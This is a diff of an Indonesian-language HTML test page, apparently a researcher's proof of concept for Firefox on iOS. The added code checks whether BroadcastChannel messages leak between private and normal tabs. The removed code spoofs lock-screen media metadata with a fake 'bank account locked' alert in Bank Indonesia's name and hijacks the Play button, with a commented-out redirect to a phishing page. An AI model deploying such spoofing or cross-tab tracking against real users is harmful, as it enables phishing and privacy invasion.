@@ -6,96 +6,78 @@
   <title>Test</title>
 </head>
 <body style="font-family: sans-serif; padding: 20px; background: #ffffff;">
-  <p>Buka di Firefox iOS. Pencet tombol di bawah.</p>
-  <p>Kalau setelah pencet tombol, Lock Screen / Control Center lu nampilin lagu palsu, berarti BUG.</p>
-  <button onclick="testMediaSession()" style="font-size: 20px; padding: 15px 30px;">Set Media Session Palsu</button>
+  <p>Buka di 【entity-Firefox¦canonical_name=Firefox】 iOS. Ikutin langkahnya.</p>
+  <p>Kalau pesan dari Tab Biasa bisa nyampe ke Tab Private (atau sebaliknya), berarti Private Mode-nya bocor.</p>
+  <p><b>Mode tab ini:</b> <span id="mode">Mengecek...</span></p>
+  <button onclick="sendMsg()" style="font-size: 20px; padding: 15px 30px;">Kirim Pesan ke Tab Lain</button>
   <br><br>
-  <button onclick="testMediaSessionAction()" style="font-size: 20px; padding: 15px 30px;">Tes Tombol Play di Lock Screen</button>
-  <br><br>
-  <pre id="o" style="background: #f0f0f0; padding: 15px; white-space: pre-wrap;">Belum dites. Pencet tombol di atas.</pre>
+  <pre id="o" style="background: #f0f0f0; padding: 15px; white-space: pre-wrap;">Belum dites. Buka halaman ini di 2 tab (1 Tab Biasa + 1 Tab Private), terus pencet tombol di salah satu tab.</pre>
 
   <script>
-    function testMediaSession(){
-      var o = document.getElementById('o');
-      o.innerText = "Mencoba navigator.mediaSession.metadata...\n";
-      o.innerText += "----------------------------------------\n";
+    var myId = 'ID-' + Math.random().toString(36).substring(2, 8) + '-' + Date.now();
+    var bc = null;
 
-      try{
-        if(!navigator.mediaSession){
-          o.innerText += "navigator.mediaSession TIDAK ADA (AMAN - Firefox nge-block Media Session API).";
-          return;
-        }
-
-        o.innerText += "navigator.mediaSession ADA di Firefox iOS ini.\n\n";
-
-        // Ini yang dites: Apakah Media Session bisa di-set tanpa ada media yang diputer?
-        // Seharusnya, iOS harus nolak Media Session kalau gak ada media yang diputer.
-        navigator.mediaSession.metadata = new MediaMetadata({
-          title: '⚠️ AKUN BANK LU TERKUNCI! Klik di sini',
-          artist: '【entity-Bank Indonesia¦canonical_name=Bank Indonesia】 - Verifikasi Sekarang',
-          album: 'Pesan Penting dari Bank',
-          artwork: [
-            { src: 'https://0x403for.github.io/bank-logo.png', sizes: '512x512', type: 'image/png' }
-          ]
-        });
-
-        o.innerText += "Media Session metadata BERHASIL di-set!\n";
-        o.innerText += "Title: ⚠️ AKUN BANK LU TERKUNCI! Klik di sini\n";
-        o.innerText += "Artist: 【entity-Bank Indonesia¦canonical_name=Bank Indonesia】 - Verifikasi Sekarang\n";
-        o.innerText += "Album: Pesan Penting dari Bank\n\n";
-        o.innerText += "Sekarang:\n";
-        o.innerText += "1. Kunci HP lu (pencet tombol power).\n";
-        o.innerText += "2. Liat Lock Screen lu. Apakah ada lagu / media yang judulnya 'AKUN BANK LU TERKUNCI!'?\n";
-        o.innerText += "3. Atau buka Control Center (swipe dari pojok kanan atas). Liat apakah ada media player yang judulnya 'AKUN BANK LU TERKUNCI!'?\n\n";
-        o.innerText += "Kalau ADA, berarti BUG! Website bisa palsuin media di Lock Screen / Control Center tanpa ada media yang diputer.\n";
-        o.innerText += "Kalau GAK ADA, berarti AMAN - iOS nolak Media Session karena gak ada media yang diputer.\n";
-        o.innerText += "\nCatatan: Untuk artwork-nya, lu harus upload gambar bank-logo.png dulu ke 0x403for.github.io, atau ganti URL-nya ke gambar yang udah ada (misal https://0x403for.github.io/google.jpg).";
-
-      }catch(e){
-        o.innerText += "Error (AMAN): " + e;
-      }
+    // Coba deteksi Private Mode lewat Storage (ini cara kasar, tapi buat nandain tab ini Private atau Biasa)
+    try{
+      localStorage.setItem('test-private', '1');
+      localStorage.removeItem('test-private');
+      document.getElementById('mode').innerText = 'Tab Biasa (kemungkinan, karena localStorage bisa ditulis)';
+    }catch(e){
+      document.getElementById('mode').innerText = 'Tab Private (kemungkinan, karena localStorage di-block / error: ' + e + ')';
     }
 
-    function testMediaSessionAction(){
-      var o = document.getElementById('o');
-      o.innerText = "Mencoba set Media Session Action Handler (Play/Pause)...\n";
-      try{
-        if(!navigator.mediaSession){
-          o.innerText += "navigator.mediaSession TIDAK ADA.";
-          return;
-        }
+    try{
+      bc = new BroadcastChannel('private-leak-test');
+      document.getElementById('o').innerText = "BroadcastChannel BERHASIL dibuat!\n";
+      document.getElementById('o').innerText += "ID tab ini: " + myId + "\n";
+      document.getElementById('o').innerText += "Mode tab ini: " + document.getElementById('mode').innerText + "\n\n";
+      document.getElementById('o').innerText += "Sekarang:\n";
+      document.getElementById('o').innerText += "1. Buka halaman ini juga di tab yang satunya (kalau ini Tab Biasa, buka di Tab Private, dan sebaliknya).\n";
+      document.getElementById('o').innerText += "2. Di salah satu tab, pencet tombol 'Kirim Pesan ke Tab Lain'.\n";
+      document.getElementById('o').innerText += "3. Liat di tab yang satunya: Apakah pesan-nya nyampe?\n\n";
 
-        // Ini yang dites: Apakah website bisa hijack tombol Play/Pause di Lock Screen?
-        // Misal korban pencet Play di Lock Screen, website-nya malah buka tab phishing.
-        navigator.mediaSession.setActionHandler('play', function(){
-          o.innerText += "BUG! Tombol PLAY di Lock Screen / Control Center berhasil di-hijack!\n";
-          o.innerText += "Korban pencet Play di Lock Screen, tapi yang ke-trigger malah fungsi ini di website.\n";
-          o.innerText += "Attacker bisa ganti fungsi ini jadi: window.open('https://phishing-bank.com') / window.location = 'https://phishing-bank.com'\n";
-          // JANGAN uncomment ini pas ngetes, ini cuma contoh:
-          // window.open('https://0x403for.github.io/phishing.html');
-        });
+      bc.onmessage = function(e){
+        var o = document.getElementById('o');
+        o.innerText += "\n=== PESAN DITERIMA! ===\n";
+        o.innerText += "Dari ID: " + e.data.id + "\n";
+        o.innerText += "Isi pesan: " + e.data.msg + "\n";
+        o.innerText += "Waktu: " + e.data.time + "\n\n";
+        o.innerText += "BUG! Pesan dari tab lain BERHASIL nyampe ke tab ini!\n";
+        o.innerText += "Kalau tab ini Tab Private dan pengirim-nya Tab Biasa (atau sebaliknya), berarti Private Mode-nya BOCOR.\n";
+        o.innerText += "Website bisa nge-track lu walaupun lu udah Private Mode, karena ID-nya sama.\n";
+        o.innerText += "Screenshot ini + screenshot tab satunya (yang ngirim pesan).\n";
+      };
 
-        navigator.mediaSession.setActionHandler('pause', function(){
-          o.innerText += "BUG! Tombol PAUSE di Lock Screen berhasil di-hijack juga!\n";
-        });
+      bc.onmessageerror = function(e){
+        document.getElementById('o').innerText += "Message error (AMAN?): " + e + "\n";
+      };
 
-        navigator.mediaSession.metadata = new MediaMetadata({
-          title: 'Tes Tombol Play - Pencet Play di Lock Screen',
-          artist: 'Test - Sarwo Edi Wibowo',
-          album: 'Media Session Test'
-        });
-
-        o.innerText += "Action Handler Play/Pause BERHASIL di-set!\n\n";
-        o.innerText += "Sekarang:\n";
-        o.innerText += "1. Kunci HP lu, liat Lock Screen, pencet tombol Play di media player-nya.\n";
-        o.innerText += "2. Buka lagi Firefox, liat apakah teks di sini berubah jadi 'Tombol PLAY berhasil di-hijack!'?\n";
-        o.innerText += "3. Kalau berubah, berarti website bisa hijack tombol Play di Lock Screen.\n";
-        o.innerText += "4. Kalau gak berubah, berarti AMAN - iOS gak ngasih action handler-nya ke website karena gak ada media yang diputer.\n";
-
-      }catch(e){
-        o.innerText += "Error (AMAN): " + e;
-      }
+    }catch(e){
+      document.getElementById('o').innerText = "BroadcastChannel TIDAK ADA / Error (AMAN - Firefox nge-block BroadcastChannel): " + e;
     }
+
+    function sendMsg(){
+      if(!bc){
+        alert("BroadcastChannel gak ada");
+        return;
+      }
+      var msg = {
+        id: myId,
+        msg: 'Halo dari tab ' + document.getElementById('mode').innerText + ' - ID: ' + myId,
+        time: new Date().toString()
+      };
+      bc.postMessage(msg);
+      document.getElementById('o').innerText += "\nPesan DIKIRIM dari tab ini (ID: " + myId + "). Cek tab satunya, apakah pesan-nya nyampe?\n";
+    }
+
+    // Kirim pesan otomatis pas halaman di-load, biar gak perlu klik (ini yang dites: Apakah BroadcastChannel bisa kirim otomatis tanpa klik?)
+    window.addEventListener('load', function(){
+      setTimeout(function(){
+        if(bc){
+          bc.postMessage({id: myId, msg: 'Pesan OTOMATIS dari tab ' + document.getElementById('mode').innerText, time: new Date().toString()});
+        }
+      }, 3000);
+    });
   </script>
 </body>
 </html>
